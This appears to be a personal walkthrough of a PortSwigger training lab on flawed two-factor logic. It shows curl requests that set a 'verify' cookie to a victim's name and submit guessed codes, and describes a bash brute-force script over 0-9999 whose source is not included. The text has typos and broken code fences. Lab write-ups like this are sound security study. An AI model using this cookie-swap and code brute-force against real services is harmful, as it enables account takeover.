# Lab: 2FA broken logic
Level: #Practitioner 

## Description
Taken from the [portswigger lab](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic):

*This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.*

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`

*You also have access to the email server to receive your 2FA verification code.*


#### Tools
- [Cookie editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/)


## Enumeration
When Access de lab it would run a website in a random subdomain with the following structure:

`https://[random-32-hex-value].web-security-academy.net/`
The first  page's section looks like:
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net
```
![index](04-ðŸ›¬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/index.png)

Go to the `My account` send me to `/login` view:
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net/login
```
![login](04-ðŸ›¬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/login.png)

Since I have the `wiener:peter` credentials from the lab's description, I am gonna using to check that it redirects to `/login2`.
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net/login2
```
![login2](04-ðŸ›¬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/login2.png)

And to see the security code they provime it with a `Email clien` buttom that send me to the following `/email` view.
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net/email
```
![email](email.png)

If I use that code, it redirects me to `/my-account`
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net/my-account
```
![my-account](04-ðŸ›¬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/my-account.png)

But somethings strange and probably one of the flawed logic is that if I go directly to `/login2` it send me to the verify code view, but at this point you surely are ask you "How the server know who to send the code?" and the answer as well as you are thinking. It is in the cookie!

Using [Cookie editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) firefox addon (to see and modify the cookies confortably) note that there is a `verify` cookie with the `wiener` name.
![cookieEditor](02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/cookieEditor.png)

If i check the wiener email in `/email` there is a lot of verification  codes for each GET request to `/login2`.

Then, the name i put in the `verify` cookie will recieve the verify code. So now check how many times the server allow me try the code. But fortunally to me, there is no limit, only return a `Incorrect security code` error message. So to bruteforce!


## Foothold

Well, before to bruteforce first check the requests manually:

GET requests to ensure verification code is send to email (test with `wiener` user.
```shell
$ curl -s "https://0a370060031c8605c053707000e5000a.web-security-academy.net/login2" -b "verify=wiener" 
```

Now to POST request with a incorrect security code check witch name has the parameter:![inspector](04-ðŸ›¬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/inspector.png)

And add it in the `curl` with `--data-raw` with a random code, and get the `Incorrect security code`
```shell
$ curl -s "https://0a370060031c8605c053707000e5000a.web-security-academy.net/login2" -b "verify=wiener" --data-raw "mfa-code=1234"

```

And with the correct code it redirects to  `/my-account`

In this way I need automatizate the process to check every guess between 0-9999. Since i know there will be the same code in every attemp. only I am going to to a loop between that range until hit the correct value.

## Script

I wrote the script  `.sh` . which has the username like argument. If I test it with `wiener` to get the code in the `/email` view:

```shell
$ ./bruteForce2FA.sh > output.txt
```

I redirect the script STDOUT to the `output.txt` file. In this way I can save the total data and analize it. In this case in another shell I use `tail`  to see the last lineas and use `-f`  switch  to interactive see each update.

```shell
$ tail output.txt -f

Now again but with the `carlos` name in the cookie `verify` 
```shell
$ ./bruteForce2FA.sh > output.txt
```

```shell

### Notes

- To enter the code in the browser you have to have the `/login2` view open previously to avoid overwrite the security code. (or only catch the cookie session and use that in the cooki to `/my-accoynt` view)
- Since script execute mulitples process in paralell, maybe we dont see the string `Find it! password...` in the last line. But the script will stop so only we need to check where is the message.
